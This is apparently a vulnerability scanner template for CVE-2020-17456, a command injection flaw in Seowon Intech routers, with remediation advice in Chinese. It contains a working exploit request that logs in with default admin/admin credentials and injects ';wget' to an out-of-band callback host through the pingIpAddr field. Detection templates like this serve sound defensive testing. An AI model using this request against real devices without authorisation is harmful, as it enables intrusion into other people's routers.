id: CVE-2020-17456
info:
  name: SEOWON INTECH SLC-130 & SLR-120S - Unauthenticated Remote Code Execution
  author:
  - gy741
  - edoardottt
  description: |-
    Seowon Intech SLC-130和SLR-120S远程代码执行漏洞
    Seowon Intech SLC-130和SLR-120S中存在安全漏洞。攻击者可通过向system_log.cgi页面发送‘ipAddr’参数利用该漏洞执行代码。
  severity: critical
  remediation: |-
    官方修复方案：
    1、建议用户到官方获取最新补丁或者最新版本程序：
    http://www.seowonintech.co.kr/

    临时修复方案：
    1、在执行涉及到可以将字符串作为代码执行的函数时，需要严格验证用户传递的参数，同时尽量避免用户控制参数。
    2、使用escapeshellarg函数处理相关参数。Escapeshellarg函数会将任何引起参数或命令结束的字符进行转义，如单引号“’”会被转义为“\’”，双引号“””会被转义为“\””，分号“;”会被转义为“;”，这样escapeshellarg会将参数内容限制在一对单引号或双引号里面，转义参数中所包含的单引号或双引号，使其无法对当前执行进行截断，实现防范命令注入攻击的目的。
requests:
- matchers:
  - type: word
    part: interactsh_protocol
    words:
    - http
  - type: word
    part: header
    words:
    - text/html
  - type: status
    status:
    - 200
  matchers-condition: and
  raw:
  - |
    POST /cgi-bin/login.cgi HTTP/1.1
    Host: {{Hostname}}
    Origin: {{BaseURL}}
    Referer: {{BaseURL}}
    Content-Type: application/x-www-form-urlencoded

    browserTime=081119502020&currentTime=1597159205&expires=Wed%252C%2B12%2BAug%2B2020%2B15%253A20%253A05%2BGMT&Command=Submit&user=admin&password=admin
  - |
    POST /cgi-bin/system_log.cgi HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded

    Command=Diagnostic&traceMode=ping&reportIpOnly=&pingIpAddr=;wget http://{{interactsh-url}}&pingPktSize=56&pingTimeout=30&pingCount=4&maxTTLCnt=30&queriesCnt=3&reportIpOnlyCheckbox=on&logarea=com.cgi&btnApply=Apply&T=1646950471018
  cookie-reuse: true
